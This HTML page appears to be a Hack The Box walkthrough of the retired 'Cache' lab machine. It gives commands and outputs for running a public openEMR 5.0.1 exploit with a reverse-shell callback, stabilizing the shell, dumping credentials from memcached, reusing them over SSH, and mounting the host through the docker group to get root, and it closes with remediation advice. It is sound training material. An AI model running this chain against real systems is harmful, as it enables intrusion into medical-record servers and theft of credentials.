@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Cache: openEMR portal RCE and a docker group escape — Lucky Thandel</title>
+<meta name="description" content="Full walkthrough: Apache + openEMR 5.0.1 recon, public portal exploit chain to a web shell, memcached credential dump for lateral move to ash, and a docker-group mount to root — each step with commands and outputs. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-27 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Cache: openEMR portal RCE and a docker group escape</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Cache is an easy Linux box with a medical-records theme: Apache serving openEMR 5.0.1 plus a memcached daemon, and a docker installation for the finale. The story in one line: version the clinic app, ride the public portal exploit chain to a web shell, dump the cache for credentials, move laterally to ash, and mount the host through the docker group. This walkthrough follows that order — recon, foothold, lateral move, privilege escalation — with the commands and outputs at each step.</p>
+<h2><span class="amber">$</span> Box info</h2>
+<p>OS: Linux. Difficulty: easy. Address: 10.10.10.188. Services that matter: OpenSSH on 22, Apache on 80 (openEMR clinic app), memcached on 11211. Skills exercised: web enumeration and version matching, public exploit operation, cache-protocol credential recovery, docker-group escape.</p>
+<h2><span class="amber">$</span> Skills required</h2>
+<p>Nmap service enumeration, web directory discovery, matching application versions to public exploits, netcat listener handling and shell stabilization, memcached protocol basics, SSH reuse, docker fundamentals.</p>
+<h2><span class="amber">$</span> Recon — initial scanning</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: all ports, then targeted scripts and versions</span>
+nmap -p- --min-rate=1000 -Pn -T4 10.10.10.188 -oN cache.all
+nmap -p22,80,11211 -Pn -sC -sV 10.10.10.188 -oN cache.targeted</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: the three services that matter</span>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+11211/tcp open  memcache</pre>
+<p>Three services, no more: SSH for later credential reuse, Apache hosting the actual application, and memcached — a cache daemon speaking a friendly plaintext protocol. Note the Apache version string and move to the web app before touching anything else.</p>
+<h2><span class="amber">$</span> Recon — the clinic app on TCP 80</h2>
+<p>Port 80 serves a hospital-themed landing page with a login, and directory discovery finds the real application under /openemr. The login page advertises version 5.0.1 in its footer — a versioned, healthcare-adjacent PHP application is the lead for the whole box, so confirm the version string and immediately match it against the public exploit set instead of brute-forcing credentials.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: find the app and match the version to exploits</span>
+gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40
+# -&gt; /openemr (login page footer: v5.0.1)
+searchsploit openemr 5.0.1</pre>
+<p>Searchsploit returns public exploit coverage for openEMR 5.0.1: a patient-portal authentication bypass chained to remote code execution. That chain needs no valid credentials, which is why login brute-forcing here is a dead end — version-match first, then operate the public chain.</p>
+<h2><span class="amber">$</span> Foothold — openEMR portal exploit chain</h2>
+<p>Set up the listener first, then run the matched public exploit against the /openemr path with your callback address and port. The portal bypass lands execution as the web user and calls back to the listener.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: listener up, then the public portal chain</span>
+nc -lvnp 4444
+# in a second terminal, against the lab target:
+python3 openemr-501-rce.py http://10.10.10.188/openemr 10.10.14.23 4444</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nc: the www-data callback</span>
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.188] 43012
+$ whoami
+www-data</pre>
+<p>Stabilize before doing anything else: upgrade to a full pty with python, background the shell, set the terminal to raw, and foreground again. Every later step — cache queries, SSH, docker — is smoother from a stable shell.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: stabilize the web shell</span>
+python3 -c &quot;import pty; pty.spawn(&quot;/bin/bash&quot;)&quot;
+# Ctrl+Z, then locally:
+stty raw -echo; fg
+# back in the shell:
+export TERM=xterm; stty rows 40 cols 160</pre>
+<h2><span class="amber">$</span> Enumeration as www-data</h2>
+<p>Take stock: there is a human user ash with a home directory, and user.txt sits there unreadable from www-data. Meanwhile port 11211 answers the memcached protocol. The box is literally named Cache — every cache, queue, and memory-store service on every box gets dumped, and here it is the intended second act, not noise.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: users, flags, and the cache daemon</span>
+ls /home                 # -&gt; ash
+ls -l /home/ash/user.txt  # owned by ash, not readable yet
+ss -tlnp | grep 11211     # memcached listening</pre>
+<h2><span class="amber">$</span> Lateral move — dump the cache</h2>
+<p>Talk to memcached in its own language: list the slab items, dump the cached keys, then get each key. One of the cached entries holds credential material for the ash account — application caches routinely retain passwords and session data in plaintext.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: memcached item dump and key read</span>
+(echo &quot;stats items&quot;; echo quit) | nc 127.0.0.1 11211
+(echo &quot;stats cachedump 1 0&quot;; echo quit) | nc 127.0.0.1 11211
+# -&gt; key list; read each one:
+(echo &quot;get &lt;KEY-FROM-CACHEDUMP&gt;&quot;; echo quit) | nc 127.0.0.1 11211
+# -&gt; credential material for ash</pre>
+<p>Reuse the recovered password over SSH as ash and read the user flag. Credentials found in caches are almost always reused somewhere nearby — SSH as the named home-directory user is the first place to try.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: SSH reuse and the user flag</span>
+ssh ash@10.10.10.188
+cat ~/user.txt   # (value redacted per HTB rules)</pre>
+<h2><span class="amber">$</span> Privilege escalation — docker group escape</h2>
+<p>Check groups immediately after landing: id places ash in the docker group. Docker group membership is root-equivalent by design — any member can start a privileged container with the host filesystem mounted, which bypasses every file permission on the box. List the locally available images first so the run command references one that exists.</p>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: confirm the group, pick an image, mount the host</span>
+id                 # ... groups=... ,999(docker), ...
+docker images      # use any image present locally
+docker run --rm -it --privileged -v /:/mnt &lt;IMAGE&gt; chroot /mnt /bin/bash</pre>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: root from inside the mounted host</span>
+cat /root/root.txt   # (value redacted per HTB rules)
+cat /home/ash/user.txt</pre>
+<p>With the host root mounted at /mnt, both flags fall without any kernel exploit. Flag values are redacted per HTB rules — run these steps in your own lab to earn them.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Brute-forcing the openEMR login burns time the public chain never needed — the 5.0.1 portal chain bypasses authentication, so version-match before password-guessing. Treating memcached as background noise misses the lateral move — dump every cache and queue service on every machine. And reaching for kernel exploits before checking id output misses the intended finale: group membership is the finding.</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Patch openEMR past 5.0.1 immediately — medical-record systems raise every impact category. Firewall memcached to localhost and require authentication so application caches are never world-readable. Never grant docker group membership to service or human accounts that are not administrators; treat it as root-equivalent in every access review. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
